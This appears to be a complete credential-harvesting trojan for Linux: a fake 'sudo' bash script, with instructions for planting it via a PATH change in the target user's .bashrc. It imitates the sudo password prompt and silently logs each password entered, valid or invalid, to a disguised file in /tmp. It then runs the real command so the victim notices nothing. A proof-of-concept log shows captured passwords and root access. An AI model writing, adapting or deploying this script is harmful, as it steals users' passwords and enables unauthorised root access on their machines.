# Installation:
# Append the following line to the target user's .bashrc file by running
# the following command:
# $ echo "export PATH=~/.payload:$PATH" >> ~/.bashrc
#
# Then, create ~/.payload/sudo and paste the following code in the file.
# Don't forget to make the bash script executable by issuing the following
# command:
#
# $ chmod a+x ~/.payload/sudo
# 
# Obviously you might have to adapt this installation recipe to fit the user's
# shell. If they are using zsh, then install to ~/.zshrc, etc.
#
# Proof of concept: foobar is the target with password `foobarz1`
# [foobar:~]$ tail -n 1 ~/.bashrc
# export PATH=~/.payload:$PATH
# [foobar:~]$ ls -la ~/.payload/sudo 
# -rwxr-xr-x 1 foobar foobar 420 Aug 16 01:21 /home/foobar/.payload/sudo
# [foobar:~]$ sudo id
# [sudo] password for foobar: [inserted wrong password `barbaz` here as proof of concept]
# Sorry, try again.
# [sudo] password for foobar: [inserted `foobarz1` here]
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)
# [foobar:~]$ cat /tmp/.ICE-unix-test 
# foobar:barbaz:invalid
# foobar:foobarz1:valid
# [foobar:~]$ sudo id [the system remembers previous authentification]
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log)

#!/bin/bash
/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ]
then
    /usr/bin/sudo $@
else
    echo -n "[sudo] password for $USER: "
    read -s pwd
    echo
    echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
    if [ $? -eq 1 ]
    then
	echo "$USER:$pwd:invalid" >> /tmp/.ICE-unix-test
	echo "Sorry, try again."
	sudo $@
    else
	echo "$USER:$pwd:valid" >> /tmp/.ICE-unix-test
	echo "$pwd" | /usr/bin/sudo -S $@
    fi
fi
